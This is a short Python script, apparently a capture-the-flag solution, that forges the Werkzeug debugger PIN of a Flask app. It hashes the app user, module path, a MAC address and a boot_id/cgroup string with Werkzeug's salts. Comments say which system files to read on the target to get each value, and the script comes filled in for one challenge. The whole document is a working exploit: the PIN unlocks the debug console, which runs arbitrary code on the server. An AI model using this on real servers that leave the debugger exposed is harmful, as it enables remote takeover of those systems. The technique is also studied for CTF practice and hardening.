import hashlib
from itertools import chain

def gen(pub,priv):
  h = hashlib.sha1()

  for bit in chain(pub, priv):
    if not bit:
      continue
    if isinstance(bit, str):
      bit = bit.encode("utf-8")
    h.update(bit)

  h.update(b'cookiesalt')
  h.update(b'pinsalt')
  
  num = ('%09d' % int(h.hexdigest(), 16))[:9]

  rv = None
  for group_size in 5, 4, 3:
    if len(num) % group_size == 0:
      rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                    for x in range(0, len(num), group_size))
      break
  else:
    rv = num

  return rv


pub = [
  "app", # Name of user that runs the app (changes from challenge to challenge)
  "flask.app", # module.__name__ (no need to change)
  "Flask", # getattr(app, '__name__', getattr(app.__class__, '__name__')) (no need to change)
  "/usr/local/lib/python3.11/site-packages/flask/app.py" # getattr(module, '__file__', None) (no need to change)
]

priv = [
  # Get MAC address /sys/class/net/*/address
  # Then convert to decimal        ^ This is the network interface (probably eth0), can be found in /proc/net/arp
  "2485377892354" # MAC address
  # (/etc/machine-id or /proc/sys/kernel/random/boot_id) + first line of /proc/self/cgroup after last slash
  # For this challenge, there is no /etc/machine-id, so we use /proc/sys/kernel/random/boot_id + first line of /proc/self/cgroup after last slash
  "e18fddf1-e85b-46d0-8fc0-61800f51ea49e8ce01cf2c78860dcacca2c092573abfa6081de75930141fb96f812108c0689b"
]


if __name__ == "__main__":
  print(gen(pub,priv))